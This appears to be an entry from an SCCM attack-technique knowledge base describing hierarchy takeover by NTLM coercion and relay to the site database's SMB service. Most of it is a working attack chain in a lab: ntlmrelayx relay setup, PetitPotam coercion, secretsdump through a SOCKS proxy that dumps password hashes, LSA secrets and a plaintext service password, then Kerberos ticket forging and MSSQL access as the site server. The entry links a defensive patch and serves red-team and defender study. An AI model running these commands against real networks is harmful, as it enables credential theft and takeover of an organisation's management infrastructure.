# TAKEOVER-2

## Description
Hierarchy takeover via NTLM coercion and relay to SMB on remote site database

## MITRE ATT&CK TTPs
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement

## Requirements
-
-

## Summary

## Impact

## Subtechniques
- TAKEOVER-2.1: Coerce primary site server
- TAKEOVER-2.2: Coerce passive site server

## Defensive IDs
- [PREVENT-1: Patch SCCM Site Server with KB15599094](../defense-techniques/PREVENT/PREVENT-1/prevent-1_description.md)

## Examples
The steps to execute TAKEOVER-2.1 and TAKEOVER-2.2 are mostly the same except that a different system is targeted for coercion of NTLM authentication.

1. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the site database server:


### Windows
1. 


### Linux
1. Start `ntlmrelayx` with a SOCKS proxy
```
└─# ntlmrelayx.py -t smb://10.10.100.8 -socks -smb2support
Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] SMTP Socks Plugin loaded..
[*] IMAPS Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] SMB Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>
```

2. Coerce auth

```
└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 sccm.internal.lab
Trying pipe lsarpc
[-] Connecting to ncacn_np:sccm.internal.lab[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

3. Receive connection on relay server

```
[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.9, attacking target smb://10.10.100.8
[*] Authenticating against smb://10.10.100.8 as LAB/SCCM$ SUCCEED
[*] SOCKS: Adding LAB/SCCM$@10.10.100.8(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.9 controlled, but there are no more targets left!
socks
Protocol  Target       Username   AdminStatus  Port
--------  -----------  ---------  -----------  ----
SMB       10.10.100.8  LAB/SCCM$  TRUE         445
ntlmrelayx>
```

4. Proxy in secretsdump

```
└─# proxychains secretsdump.py 'lab/sccm$@10.10.100.8' -no-pass
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.100.8:445  ...  OK
[*] Target system bootKey: 0xf81f8be7c4c43d38858d17318ffa025e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:26f78b6fd483ddd6c54497e6ffbffbc2:::
[*] Dumping cached domain logon information (domain/username:hash)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-10 00:27:04)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-10 02:33:07)
INTERNAL.LAB/sqlsvc:$DCC2$10240#sqlsvc#e12866f9a8777ddbe39ae1380ac6346c: (2024-02-23 22:25:28)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-20 03:20:11)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-22 21:51:57)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-23 00:31:30)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-03-01 17:04:52)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
LAB\SQL$:aes256-cts-hmac-sha1-96:8d15fd9651116c18930d6244351147f367cdb25b163acf8e112139c5462ba832
LAB\SQL$:aes128-cts-hmac-sha1-96:340346aa26b46b5a7be81b478c3e0d27
LAB\SQL$:des-cbc-md5:2a80e6012a02b586
LAB\SQL$:plain_password_hex:2f007700410042003b0047005d00720044006d00370047007700390073003200690035002b0054005e0031004e005c004300450037003c004d005100560035003c0043005c003a00380050002f004900400044004b0069002d00740026003d0043004b004e006b0061005000690059005000480049004c0065005e00600054003c006f0048003d004600690067005d004d004000670070005d005800370078006a0043003a0047003f0034006b00640056002e004500440052002600200049006900230047005800620058002200510069006800220032003e007400360043005d00780032002f002800260061004300
LAB\SQL$:aad3b435b51404eeaad3b435b51404ee:e0173405c3e9c5ecaba657bc628889ce:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xb5ca959a9a6ed97054bdae10d23275b776378b3d
dpapi_userkey:0x49206429f367c2e332d88015e0405e68646fe959
[*] NL$KM
 0000   39 47 80 9E 3B 1E F2 D0  3C 1F 6D C5 E3 77 A9 9C   9G..;...<.m..w..
 0010   F4 8A EF DD 7E 4D 10 2D  1E 59 F9 B3 FB FE 1F E9   ....~M.-.Y......
 0020   86 4E 14 EF 0D E8 0D 8A  7C 85 B8 66 A4 C9 DD DC   .N......|..f....
 0030   CE DD F1 02 33 72 BD 1C  CF 1E 53 F1 28 F4 5B AE   ....3r....S.(.[.
NL$KM:3947809e3b1ef2d03c1f6dc5e377a99cf48aefdd7e4d102d1e59f9b3fbfe1fe9864e14ef0de80d8a7c85b866a4c9dddcceddf1023372bd1ccf1e53f128f45bae
[*] _SC_MSSQLSERVER
LAB\sqlsvc:P@ssw0rd
[*] Cleaning up...

```

5. Get TGT for SQL service account running the site database

```
└─# getTGT.py internal.lab/sqlsvc:"P@ssw0rd"
Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

[*] Saving ticket in sqlsvc.ccache
```

6. S4U

```
└─# python3 gets4uticket.py kerberos+ccache://internal.lab\\sqlsvc:sqlsvc.ccache@dc01.internal.lab MSSQLSvc/sql.internal.lab:1433@internal.lab sccm\$@internal.lab sccm_s4u.ccache -v
2024-03-01 21:31:03,310 minikerberos INFO     Trying to get SPN with sccm$@internal.lab for MSSQLSvc/sql.internal.lab:1433@internal.lab
INFO:minikerberos:Trying to get SPN with sccm$@internal.lab for MSSQLSvc/sql.internal.lab:1433@internal.lab
2024-03-01 21:31:05,126 minikerberos INFO     Success!
INFO:minikerberos:Success!
2024-03-01 21:31:05,127 minikerberos INFO     Done!
INFO:minikerberos:Done!
```
7. Auth to MSSQL

```
└─# KRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm\$@sql.internal.lab  -k -no-pass -windows-auth
Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed database context to 'master'.
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (LAB\sccm$  dbo@master)> use CM_LAB
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: CM_LAB
[*] INFO(SQL): Line 1: Changed database context to 'CM_LAB'.
SQL (LAB\sccm$  dbo@CM_LAB)> select * from RBAC_Admins;
 AdminID                                                      AdminSID   LogonName           DisplayName   IsGroup   IsDeleted   CreatedBy           CreatedDate   ModifiedBy          ModifiedDate   SourceSite   DistinguishedName   AccountType
--------   -----------------------------------------------------------   -----------------   -----------   -------   ---------   -----------------   -----------   -----------------   ------------   ----------   -----------------   -----------
16777217   b'0105000000000005150000005407a9ee65b1f9b01fff385ef4010000'   LAB\Administrator   NULL                0           0   LAB\administrator   2024-02-10 01:21:52   LAB\administrator   2024-02-10 01:21:52   LAB          NULL                       NULL

16777220   b'0105000000000005150000005407a9ee65b1f9b01fff385e59040000'   LAB\lowpriv         lowpriv             0           0   LAB\administrator   2024-02-29 21:50:54   LAB\administrator   2024-02-29 21:50:54   LAB                                      128

SQL (LAB\sccm$  dbo@CM_LAB)>
```


## References
Author, Title, URL

exploit.ph, Revisiting Delegate 2 thyself, 